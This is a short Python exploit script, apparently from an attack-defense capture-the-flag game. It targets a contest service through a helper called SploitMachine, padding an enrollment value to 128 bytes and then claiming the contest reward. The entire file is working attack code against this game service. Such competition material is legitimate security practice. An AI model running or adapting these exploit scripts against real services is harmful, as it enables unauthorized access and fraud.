#!/usr/bin/env python3

import sys

from bluwal_lib import SploitMachine


def attack(host: str, contest_id: str):
    sm = SploitMachine(host)
    _, stub = sm.connect()

    contest = sm.get_contest(stub, contest_id)
    goal = list(contest.goal)

    assert len(goal) < 128, "checker should not create such a contest"

    varint_first_byte = goal[0] & 0x7F
    if goal[0] & 0x80:
        varint_first_byte |= 0x80

    assert varint_first_byte < 208, "checker should not create such a contest"

    initial = list(contest.threshold) + [0] * (128 - len(contest.threshold))
    enrollment_id = sm.enroll(stub, contest_id, initial)

    reward = sm.claim_reward(stub, contest_id, enrollment_id)
    print(reward)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <contest_id>")
        exit(1)

    attack(sys.argv[1], sys.argv[2])
